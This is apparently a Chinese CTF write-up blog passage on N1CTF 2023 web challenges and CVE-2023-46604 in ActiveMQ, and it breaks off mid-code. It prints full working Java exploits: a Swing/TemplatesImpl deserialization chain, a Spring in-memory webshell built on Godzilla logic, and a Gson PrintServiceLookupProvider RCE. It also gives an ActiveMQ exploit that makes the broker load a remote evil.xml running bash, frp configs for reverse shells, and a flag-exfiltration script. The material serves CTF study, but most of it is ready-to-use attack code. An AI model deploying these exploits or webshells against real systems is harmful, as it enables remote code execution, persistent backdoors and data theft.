AlignmentAction 在进行构造函数调用的时候，会不断向上去调用父类的方法 Action.NAME 为固定的 Name，name 为我们的第一参数 跟进 putValue 创建了 arrayTable , 把 Name 和 value 放入. 使用 alignmentAction.putValue ，将恶意键值也添加进 arrayTable 中. 随后 writeObject 写入序列化流 将键值对一次按队写入 readObject 会读取键值对，然后和之前一样，创建一个新的 ArrayTable 并且放入键值对. 但是如果一对键值对的 key 之前已经存入了该 key, 那么就会将该值赋值给 oldValue, 然后调用 firePropertyChange . 这里让 oldValue 为 Xstring , newValue 为 jsonnodes 即可. 要完成这个步骤，需要让 jsonnodes 的 key 和 Xstring 的 key 一致. 对此 Aecous 佬给出的方法简单粗暴，直接用 010 改文件的序列化数据 大 B 老师重写 wtireArrayTable 方法 123456789101112131415static void writeArrayTable(ObjectOutputStream s, ArrayTable table) throws IOException &#123; if (table != null &amp;&amp; table.getKeys((Object[])null) != null) &#123; int validCount = false; s.writeInt(3); s.writeObject(&quot;Name&quot;); s.writeObject(&quot;111&quot;); s.writeObject(&quot;key1&quot;); s.writeObject(table.get(&quot;key1&quot;)); s.writeObject(&quot;key1&quot;); s.writeObject(table.get(&quot;key2&quot;)); &#125; else &#123; s.writeInt(0); &#125; &#125; 不过这个方法我没打成功 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124import com.alibaba.fastjson.JSONArray;import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xpath.internal.objects.XString;import org.springframework.aop.framework.AdvisedSupport;import org.springframework.http.HttpEntity;import org.springframework.http.HttpHeaders;import org.springframework.http.ResponseEntity;import org.springframework.web.client.RestTemplate;import javax.management.BadAttributeValueExpException;import javax.swing.event.SwingPropertyChangeSupport;import javax.swing.text.StyledEditorKit;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.net.URI;import java.nio.file.Files;import java.nio.file.Paths;import java.security.*;import java.util.Base64;public class exp2 &#123; public static void main(String[] args) throws Exception &#123; byte[] code= Files.readAllBytes(Paths.get(&quot;D:\\\\java\\\\bypassjava\\\\META-INF\\\\maven\\\\com.example\\\\bypassJava\\\\target\\\\classes\\\\gsl.class&quot;)); byte[][] codes=&#123;code&#125;; TemplatesImpl templatesImpl = new TemplatesImpl(); try &#123; setFieldValue(templatesImpl, &quot;_bytecodes&quot;, codes); setFieldValue(templatesImpl, &quot;_name&quot;, &quot;1llustrious&quot;); setFieldValue(templatesImpl, &quot;_tfactory&quot;, new TransformerFactoryImpl()); &#125; catch (Exception e) &#123; throw new RuntimeException(e); &#125; Class&lt;?&gt; clazz = Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;); Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templatesImpl); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]&#123;Templates.class&#125;, handler);// POJONode jsonNodes2 = new POJONode(templatesImpl);// BadAttributeValueExpException exp2 = new BadAttributeValueExpException(null);// Field val2 = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);// val2.setAccessible(true);// val2.set(exp2,jsonNodes2);// KeyPairGenerator keyPairGenerator;// keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);// keyPairGenerator.initialize(1024);// KeyPair keyPair = keyPairGenerator.genKeyPair();// PrivateKey privateKey = keyPair.getPrivate();// Signature signingEngine = Signature.getInstance(&quot;DSA&quot;);// SignedObject signedObject = new SignedObject(exp2,privateKey,signingEngine);// POJONode jsonNodes = new POJONode(signedObject); JSONArray jsonArray = new JSONArray(); jsonArray.add(proxyObj); XString xString = new XString(&quot;111&quot;); SwingPropertyChangeSupport swingPropertyChangeSupport = new SwingPropertyChangeSupport(&quot;11&quot;); StyledEditorKit.AlignmentAction alignmentAction = new StyledEditorKit.AlignmentAction(&quot;111&quot;,1); Field field = Class.forName(&quot;javax.swing.AbstractAction&quot;).getDeclaredField(&quot;changeSupport&quot;); field.setAccessible(true); field.set(alignmentAction,swingPropertyChangeSupport); alignmentAction.putValue(&quot;key1&quot;,xString); alignmentAction.putValue(&quot;key2&quot;,jsonArray); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);// objectOutputStream.writeUTF(&quot;NEEPU&quot;);// objectOutputStream.writeInt(1949); objectOutputStream.writeObject(alignmentAction); FileOutputStream fout=new FileOutputStream(&quot;1.ser&quot;); fout.write(barr.toByteArray()); fout.close();// try &#123;// unserialize(&quot;1.ser&quot;);// &#125; catch (Exception e) &#123;// throw new RuntimeException(e);// &#125; //System.out.println(serial(exp)); //deserial(serial(map)); //doPOST(exp.toString().getBytes());// FileInputStream fileInputStream = new FileInputStream(&quot;1.ser&quot;); //System.out.println(serial(exp)); //deserial(serial(map)); //doPOST(exp.toString().getBytes());// byte[] byt=new byte[fileInputStream.available()];// fileInputStream.read(byt);// doPOST(byt); &#125; private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123; Field f = obj.getClass().getDeclaredField(field); f.setAccessible(true); f.set(obj, arg); &#125; public static Object unserialize(String filename) throws Exception &#123; ObjectInputStream ois=new ObjectInputStream(Files.newInputStream(Paths.get(filename))); Object obj=ois.readObject(); return obj; &#125; public static void doPOST(byte[] obj) throws Exception&#123; HttpHeaders requestHeaders = new HttpHeaders(); requestHeaders.set(&quot;Content-Type&quot;, &quot;text/plain&quot;);// URI url = new URI(&quot;http://neepusec.fun:27010/nomap&quot;); URI url = new URI(&quot;http://localhost:8090/nomap&quot;); //URI url = new URI(&quot;http://localhost:8080/bypassit&quot;); HttpEntity&lt;byte[]&gt; requestEntity = new HttpEntity &lt;&gt; (obj,requestHeaders); RestTemplate restTemplate = new RestTemplate(); ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class); System.out.println(res.getBody()); &#125;&#125; # 内存马 网上有很多内存马的写法，不过我整个有意思的. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.http.*;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.net.URL;import java.net.URLClassLoader;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class gsl extends AbstractTranslet &#123; public static Map&lt;String, Object&gt; store = new HashMap&lt;&gt;(); public static String xc=&quot;3c6e0b8a9c15224a&quot;; public static String pass=&quot;pass&quot;,md5; public static byte[] x(byte[] s, boolean m) &#123; try &#123; javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(&quot;AES&quot;); c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), &quot;AES&quot;)); return c.doFinal(s); &#125; catch (Exception e) &#123; return null; &#125; &#125; public static String md5(String s) &#123; String ret = null; try &#123; java.security.MessageDigest m; m = java.security.MessageDigest.getInstance(&quot;MD5&quot;); m.update(s.getBytes(), 0, s.length()); ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase(); &#125; catch (Exception e) &#123; &#125; return ret; &#125; public static String base64Encode(byte[] bs) throws Exception &#123; Class base64; String value = null; try &#123; base64 = Class.forName(&quot;java.util.Base64&quot;); Object Encoder = base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null); value = (String) Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[]&#123;byte[].class&#125;).invoke(Encoder, new Object[]&#123;bs&#125;); &#125; catch (Exception e) &#123; try &#123; base64 = Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder = base64.newInstance(); value = (String) Encoder.getClass().getMethod(&quot;encode&quot;, new Class[]&#123;byte[].class&#125;).invoke(Encoder, new Object[]&#123;bs&#125;); &#125; catch (Exception e2) &#123; &#125; &#125; return value; &#125; private static Class defineClass(byte[] classbytes) throws Exception &#123; URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader()); Method method = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class); method.setAccessible(true); return (Class) method.invoke(urlClassLoader, classbytes, 0, classbytes.length); &#125; public static byte[] base64Decode(String bs) throws Exception &#123; Class base64; byte[] value = null; try &#123; base64 = Class.forName(&quot;java.util.Base64&quot;); Object decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null); value = (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, new Class[]&#123;String.class&#125;).invoke(decoder, new Object[]&#123;bs&#125;); &#125; catch (Exception e) &#123; try &#123; base64 = Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder = base64.newInstance(); value = (byte[]) decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[]&#123;String.class&#125;).invoke(decoder, new Object[]&#123;bs&#125;); &#125; catch (Exception e2) &#123; &#125; &#125; return value; &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125; static&#123; try&#123; md5 = md5(pass + xc); WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;); configField.setAccessible(true); RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping); Method readmethod = gsl.class.getMethod(&quot;ls1&quot;, HttpServletRequest.class,HttpServletResponse.class); RequestMappingInfo info = RequestMappingInfo.paths(&quot;/ls1&quot;).options(config).build(); gsl readfile_inject = new gsl(); mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void ls1(HttpServletRequest request,HttpServletResponse response) throws Exception &#123; byte[] data=base64Decode(request.getParameter(pass)); data=x(data, false); try&#123; HttpSession session = request.getSession(); if (session.getAttribute(&quot;payload&quot;)==null)&#123; session.setAttribute(&quot;payload&quot;,defineClass(data)); &#125;else &#123; request.setAttribute(&quot;parameters&quot;,data); java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream(); Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance(); f.equals(arrOut); f.equals(request); response.getWriter().write(md5.substring(0,16)); f.toString(); response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true))); response.getWriter().write(md5.substring(16));&#125; &#125; catch (Exception e)&#123;&#125; &#125; &#125; 看着眼熟吗，没错，就是 godzilla🐎. 👴在广为流传的 Spring 内存🐎的基础上，引入了 godzilla🐎的逻辑. # kali_tips 之后进行一波 MSF 上线，什么，你说 kali 不出网，没法反弹 shell?👴来告诉你怎么办. 首先你需要一个公网 IP,🤣🤣🤣🤣🤣 公网上起个 frps,frps.ini 如下 1234567891011121314[common]bind_port = 7000dashboard_user = admindashboard_pwd = frpadmin@2023dashboard_port = 7500heartbeat_timeout = 30token=frpToken@admin2023[common]server_addr = your_ip//这个ip是以目标靶机能访问到为准server_port = 7000vhost_http_port = 9001vhost_ssh_port = 9002vhost_tcp_port = 9003 然后确保 kali 能访问你的公网 ip, 接着 kali 起 frpc, 配置如下 12345678910111213141516171819202122232425262728293031[common]server_addr = ip//这个ip以kali能访问到为准server_port = 7000 token = frpToken@admin2023 [web]type = httplocal_ip = 0.0.0.0local_port = 80 custom_domains = ipremote_port = 9001 #kali ssh[ssh]type = tcplocal_ip = 0.0.0.0local_port = 22custom_domains = ipremote_port = 9002 #tcp msfconsole[tcp]type = tcplocal_ip = 0.0.0.0local_port = 9003custom_domains = ipremote_port = 9003 这里要注意到的是，frps 的服务 ip 和 frpc 的服务 ip 不一样. 在渗透的时候，往往是 windows 主机进入局域网，kali 不进，那么 frps 的 ip 配置就要以主机在局域网 ip 为准，而 frpc 的 ip 配置，以 NAT 模式配置的局域网为准. 然后 msf 生成反弹 shell 监听上线啥的就不成问题，不过 ip 要设置成映射后的 ip.","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://1llustrious.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://1llustrious.github.io/tags/WP/"}]},{"title":"N1CTF_复现","slug":"N1CTF-复现","date":"2023-12-01T00:48:46.000Z","updated":"2023-12-01T00:53:12.600Z","comments":true,"path":"2023/12/01/N1CTF-复现/","link":"","permalink":"https://1llustrious.github.io/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"# 写在前面 太顶了这比赛，还得复现学很多东西. 环境: GitHub - Nu1LCTF/n1ctf-2023 参考: [N1CTF 2023 Web 赛后复现 Writeup - Boogiepop Doesn’t Laugh (boogipop.com)](https://boogipop.com/2023/11/06/N1CTF 2023 Web 赛后复现 Writeup/#StrangePort) [N1CTF 2023 writeup (qq.com)](https://mp.weixin.qq.com/s/HQgtWIVNFyt-uN-tJDTXAw#:~:text=ggbond’s ggos) 2023n1ctf wp (qq.com) DJB!!!😝🥰 我可太喜欢大 B 老师了🥵, 受不了！！！1, 爆了！ # StrangePort 开了个服务，通过 nginx 反代，题目不出网，md 就这么想恶心👴吗😅 题目给的 controller 12345678910111213141516171819202122232425262728293031323334//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package com.api;import com.google.gson.Gson;import java.nio.charset.StandardCharsets;import java.util.Base64;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@RestController@RequestMapping(&#123;&quot;/api&quot;&#125;)public class APIController &#123; public APIController() &#123; &#125; @GetMapping(&#123;&quot;/&quot;&#125;) public String index() throws Exception &#123; return &quot;try /api/com.api.Person/eyJuYW1lIjoidXNlciIsImFnZSI6IjIwIn0=&quot;; &#125; @GetMapping(&#123;&quot;/&#123;Person&#125;/&#123;Json&#125;&quot;&#125;) public Person handleApiRequest(@PathVariable String Person, @PathVariable String Json) throws Exception &#123; Gson gson = new Gson(); Person person = (Person)gson.fromJson(new String(Base64.getDecoder().decode(Json), StandardCharsets.UTF_8), Class.forName(Person)); return person; &#125;&#125; 用自己√Ⅷ 想想都知道要通过 Gson 打一个 RCE. # 分析🤔 不多说，先 debug 看一下能不能出点什么信息. 12345678910111213141516import com.api.Person;import com.google.gson.Gson;import java.lang.reflect.InvocationTargetException;import java.nio.charset.StandardCharsets;import java.util.Base64;public class GsonDemo &#123; public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, ClassNotFoundException, IOException &#123; String Json=&quot;eyJscGNBbGxDb20iOlsidG91Y2ggL3RtcC9hYWFhYSIsInRvdWNoIC90bXAvYWFhYWEiXX0=&quot;; String Person=&quot;Person&quot;; Gson gson = new Gson(); com.api.Person o = (Person) gson.fromJson(new String(Base64.getDecoder().decode(Json), StandardCharsets.UTF_8), Class.forName(Person)); &#125;&#125;// 随便给个 base64 来个 Person😤 123456789101112131415161718192021222324252627282930313233343536373839 public class Person &#123; public Person() &#123; System.out.println(1111); &#125; public String name = &quot;john&quot;; public String age = &quot;11&quot;; public String toString() &#123; return &quot;Person&#123;name=&#x27;&quot; + this.name + &quot;&#x27;, age=&#x27;&quot; + this.age + &quot;&#x27;&#125;&quot;; &#125; public Person(String name, String age) &#123; this.name = name; this.age = age; &#125; Object writeReplace() &#123; System.out.println(&#x27;1&#x27;); return 1; &#125; public String getName() &#123; return this.name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getAge() &#123; return this.age; &#125; public void setAge(String age) &#123; this.age = age; &#125;&#125; 可以看到有构造方法，就会去调用，没有的话，就会调用 Unsafe 实例化. 所以，思考一下怎么通过 construct 到 RCE.😤 这里就可以尝试用一个 PrintServiceLookupProvider , 事实上只要实现了 PrintServiceLookup 类的都行. 写个 demo 去调试一下🤣 1234567891011121314151617181920212223242526272829303132333435import java.io.IOException;public class Person &#123; public Person() throws IOException &#123; Runtime.getRuntime().exec(&quot;whoami&quot;+age); &#125; public String name = &quot;john&quot;; public String age = &quot;11&quot;; public String toString() &#123; return &quot;Person&#123;name=&#x27;&quot; + this.name + &quot;&#x27;, age=&#x27;&quot; + this.age + &quot;&#x27;&#125;&quot;; &#125; public Person(String name, String age) &#123; this.name = name; this.age = age; &#125; public String getName() &#123; return this.name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getAge() &#123; return this.age; &#125; public void setAge(String age) &#123; this.age = age; &#125;&#125; 尝试命令拼接 不出意外地出意外了😅😓 大 B 老师说，PrintService 是会新建一个线程，进行一个重复循环如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import java.io.IOException;import java.io.Writer;public class Person &#123; class RceThread implements Runnable&#123; @Override public void run() &#123; while (true) &#123; try &#123; Runtime.getRuntime().exec(age); &#125; catch (IOException e) &#123; throw new RuntimeException(e); &#125; &#125; &#125; &#125; public Person() throws IOException &#123; Thread thr = new Thread(null, new Person.RceThread(), &quot;Rce&quot;, 0, false); thr.setDaemon(true); thr.start(); &#125; public String name = &quot;john&quot;; public String age = &quot;11&quot;; public String toString() &#123; return &quot;Person&#123;name=&#x27;&quot; + this.name + &quot;&#x27;, age=&#x27;&quot; + this.age + &quot;&#x27;&#125;&quot;; &#125; public Person(String name, String age) &#123; this.name = name; this.age = age; &#125; public String getName() &#123; return this.name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getAge() &#123; return this.age; &#125; public void setAge(String age) &#123; this.age = age; &#125;&#125; 访问 1http://127.0.0.1:8877/api/sun.print.PrintServiceLookupProvider/eyJscGNBbGxDb20iOlsidG91Y2ggL3RtcC9hYWFhYSIsInRvdWNoIC90bXAvYWFhYWEiXX0= rce 成功 md 本地 jdk 方法不太一样，调不出来，借用一下大 B 老师的图图. # gtmdapachemq Apache ActiveMQ (版本 &lt; 5.18.3) RCE 分析 - X1r0z Blog (exp10it.cn) CVE-2023-46604 activemq&lt;5.18.3 RCE 分析 - KingBridge - 博客园 (cnblogs.com) # 环境搭建 12345678FROM apache/activemq-classic:5.17.5RUN apt-get updateRUN apt-get install wget curl netcat -yEXPOSE 61616EXPOSE 5005CMD [ &quot;tail&quot;,&quot;-f&quot;,&quot;/dev/null&quot; ] 不多说了，5005 用于 debug 用， 找到 /opt/apache-activemq/bin/linux-x86-64/wrapper.conf 加上一句 1wrapper.java.additional.14=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 运行 1/opt/apache-activemq/bin/linux-x86-64/activemq console 👴先把 exp 放这，接着跟着👴分析这怎么个事 12345678910111213141516171819202122232425262728293031323334package org.example;import javax.xml.crypto.Data;import java.io.DataOutputStream;import java.io.IOException;import java.io.OutputStream;import java.net.Socket;public class ScratchExploit &#123; public static void main(String[] args) throws IOException &#123; Socket socket = new Socket(&quot;127.0.0.1&quot;, 61616); OutputStream os = socket.getOutputStream(); DataOutputStream dos = new DataOutputStream(os); dos.writeInt(0);// size dos.writeByte(31);// type dos.writeInt(0);// CommandId dos.writeBoolean(false);// Command response required dos.writeInt(0);// CorrelationId // body dos.writeBoolean(true); // UTF dos.writeBoolean(true); dos.writeUTF(&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;); dos.writeBoolean(true); dos.writeUTF(&quot;http://192.168.111.1:8888/evil.xml&quot;); dos.close(); os.close(); socket.close(); &#125;&#125; 1234567891011&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt; &lt;constructor-arg&gt; &lt;list&gt; &lt;value&gt;bash&lt;/value&gt; &lt;value&gt;-c&lt;/value&gt; &lt;value&gt;&lt;![CDATA[touch /tmp/pwned]]&gt;&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt;&lt;/beans&gt; 起个 python 的 http 服务，别跟👴说你不会哦. # 流程分析 ここは断点😤 在这里会进行任意类的有参实例化，而 ApacheMQ 是基于 spring 的，所以自然会有 ClassPathXmlApplicationContext 这个类，我们让他进行实例化，即可完成 RCE，这个利用需要出网访问公网 ip 的恶意 xml。 # 分析如何利用到 createThrowable😊 # Java Message Service(JMS) 👴也不是很懂是啥玩意，反正跟服务有关吗，简单抄一下概念放上😒🤣 Java Message Service（JMS）是一种用于创建、发送、接收和管理消息的 Java API，通常用于构建分布式应用程序。JMS 是 Java EE（Enterprise Edition）规范的一部分，它提供了一种标准的方法来实现异步通信，使不同组件、应用程序和系统能够可靠地交换消息。 概念: 消息（Message）：JMS 消息是一种用于在应用程序之间传递信息的数据包。消息可以包含文本、字节、Map、对象等不同类型的数据。 消息生产者（Message Producer）：消息生产者是负责创建和发送消息的应用程序组件。它将消息发送到消息队列或主题。 消息消费者（Message Consumer）：消息消费者是负责接收和处理消息的应用程序组件。它订阅一个消息队列或主题，以接收发送到该队列或主题的消息。 消息队列（Queue）：消息队列是一种点对点（Point-to-Point）通信模型，其中消息生产者将消息发送到特定队列，而消息消费者从队列接收消息。每条消息只能被一个消费者接收。 主题（Topic）：主题是一种发布 / 订阅（Publish/Subscribe）通信模型，其中消息生产者将消息发送到主题，而所有订阅了该主题的消息消费者都会接收该消息。 连接工厂（Connection Factory）：连接工厂是用于创建 JMS 连接的工厂对象。连接是与消息代理（如消息队列服务器）的连接，它负责管理会话和消息的传递。 会话（Session）：会话是一个上下文，用于发送和接收消息。它提供了事务性和非事务性会话选项，以确保消息的可靠传递。 消息代理（Message Broker）：消息代理是一个中间件组件，负责接收、存储和路由消息。常见的 JMS 消息代理包括 Apache ActiveMQ、RabbitMQ 和 IBM WebSphere MQ 等。 在 JMS 中，producer client 和 consumer client 异步地向 broker 建立连接。Queue 是可消耗性的，topic 是无限的。😅 12345678910111213141516171819202122232425package org.example;import org.apache.activemq.ActiveMQConnectionFactory;import javax.jms.*;/** * Hello world! * */public class App&#123; public static void main(String[] args) throws Exception &#123; ConnectionFactory connectionFactory = new ActiveMQConnectionFactory(&quot;tcp://localhost:61616&quot;); Connection connection = connectionFactory.createConnection(); connection.start(); Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE); Destination destination = session.createQueue(&quot;tempQueue&quot;); MessageProducer producer = session.createProducer(destination); Message message = session.createObjectMessage(&quot;123&quot;); producer.send(message); connection.close(); &#125;&#125; 首先创造连接，打本地的 616 端口服务，重点在 Destination destination = session.createQueue(&quot;tempQueue&quot;); ：创建一个消息队列。这里使用 createQueue() 方法创建了一个名为 &quot;tempQueue&quot; 的队列。这是一个点对点通信模型的队列。 一般来说 Producer 将消息放在队列之中，允许其他应用程序或组件从该队列接收消息. activemq 的 broker 和 client 用 OpenWire 应用层协议通信，传输层用的是 TCP 协议。 OpenWire 通信的包会在 org.apache.activemq.openwire#doUnmarshal 反序列化 OpenWire（也称为 ActiveMQ OpenWire）是 Apache ActiveMQ 消息代理的二进制协议，用于在消息代理和 JMS 客户端之间进行通信。它是一种紧凑的、高效的协议，旨在提供快速的消息传递性能。👴简单说到这，不想长篇大幅写了 (ఠൠఠ)ﾉ 上 tnd 断点 ![1699354951791](./assets/1699354951791.png 阿米诺斯，捏麻麻地报错 哦，源赖氏没有这个类，ntmd 不早说 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.17.1&lt;/version&gt; &lt;!-- 使用适当的版本 --&gt; &lt;/dependency&gt; maven 重新加载的时候又 tmd 把自己加的依赖去掉了，重新加一下. 运行后，走到断点处 根据 dataType 指定的 DataStreamMarshaller 实现类，调用 createObject 方法。然后根据 tightEncodingEnabled 选择 tightUnmarshal 或 looseUnmarshal 一次 ApacheMQ 的通讯请求中会不断的有 marshal 和 dounmarshal 的操作 而 ExceptionResponseMarshaller 有 tightUnmarhsal 方法，会进入其 tightUnmarhsal 方法，是 BaseDataStreamMarshaller 的子类 什么？你问什么是 BaseDataStreamMarshaller ? 不就是最终漏洞利用点的地方吗. ExceptionResponseMarshaller#looseUnmarshal 会调用 looseUnmarsalThrowable，从而调用 org.apache.activemq.openwire.v12.BaseDataStreamMarshaller#createThrowable 到达漏洞利用点. 捏麻麻地，好√Ⅷ 难调，nmd 一次还有时间限制 走到 looseUnmarsalThrowable 这里就进入了恶意方法，至此，我们需要控制 clazz 和 message 因为 ExceptionResponseMarshaller 也有 marshal 方法，所以就研究如何去发送一个经由这个 marshaller 处理的 ExceptionResponse oneway 方法会调用 wireFormat.marshal() 去序列化 command command 就是前面准备发送的 ObjectMessage , 而 wireFormat 就是和它对应的序列化器 那么我们只需要手动 patch 这个方法，将 command 改成 ExceptionResponse, 将 wireFormat 改成 ExceptionResponseMarshaller 即可 this.wireFormat.marshal(command, this.dataOut); 我们在这里手动 patch 其中 command 为 CPX 类，我们的做法很简单，也只需要写一个相同的包名，这样由于方法调用机制，会优先寻找我们重写的类，然后调用其中的 onway 方法。 1234567public void oneway(Object command) throws IOException &#123; this.checkStarted(); Throwable context = new ClassPathXmlApplicationContext(&quot;http://8.130.24.188:8000/rce.xml&quot;); ExceptionResponse exceptionResponse = new ExceptionResponse(context); this.wireFormat.marshal(exceptionResponse, this.dataOut); this.dataOut.flush();&#125; 123456789101112131415package org.springframework.context.support;public class ClassPathXmlApplicationContext extends Throwable&#123; private String message; public ClassPathXmlApplicationContext(String message) &#123; this.message = message; &#125; @Override public String getMessage() &#123; return message; &#125;&#125; 注意重写 getMedssage，这是为了让服务端获取到 message，也就是实例化参数）继承 Throwable 是因为 ExceptionResponse 需要 Exception 类型，我们只是需要他的类名和传参。然后服务端会根据这 2 个值进行实例化. 真√Ⅷ 恶心，太难调了，老是掉连接. 会进行本地序列化，直接改方法 算了，根据文档，打一个 sock 协议 ActiveMQ (apache.org)😅 # 打 tmd 题目😡 nmd 题目反代不让出网，完全利用不了.😅 肖健仁！！！😡, 题目既然还有一个挂 GSON 的机子，👴就打 tmd 的 SSRF😤 参考 NESE 爹的 exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import org.apache.activemq.ActiveMQConnectionFactory;import javax.jms.*;public class Main implements MessageListener &#123; private void publish() throws Exception &#123; javax.jms.ConnectionFactory factory; factory = new ActiveMQConnectionFactory(&quot;tcp://127.0.0.1:61616&quot;); Connection connection = factory.createConnection(); Session pubSession = connection.createSession(false, Session.AUTO_ACKNOWLEDGE); Queue queue = pubSession.createQueue(&quot;flagqueue&quot;); MessageProducer publisher = pubSession.createProducer(queue); String[] cmd = new String[]&#123;&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;cat /flag&quot;&#125;; byte[] bs = new Scanner(new ProcessBuilder(cmd).start().getInputStream()) .useDelimiter(&quot;\\\\A&quot;) .next() .getBytes(); String message = new String(bs); TextMessage msg = pubSession.createTextMessage(); msg.setText(message); publisher.send(msg); System.out.println(&quot;publish finished&quot;); connection.close(); &#125; private void consume() throws Exception &#123; ConnectionFactory factory = new ActiveMQConnectionFactory(&quot;tcp://xxx:61616&quot;); Connection connection = factory.createConnection(); Session subSession = connection.createSession(false, Session.AUTO_ACKNOWLEDGE); Queue queue = subSession.createQueue(&quot;flagqueue&quot;); MessageConsumer subscriber = subSession.createConsumer(queue); subscriber.setMessageListener(this); connection.start(); &#125; public static void main(String[] args) throws Exception &#123; Main main = new Main(); main.publish(); &#125; @Override public void onMessage(Message message) &#123; try &#123; System.out.println(&quot;Received &quot; + ((TextMessage) message).getText()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 通过这个文件读 flag, 从文件 /flag 读取内容，并将其作为文本消息发送到名为 “flagqueue” 的 ActiveMQ 消息队列中。这使得其他应用程序可以订阅 “flagqueue” 队列来接收消息。 改一下 oneway, 通过这个去 SSRF 的 GSON 1234567public void oneway(Object command) throws IOException &#123; this.checkStarted(); Throwable obj = new 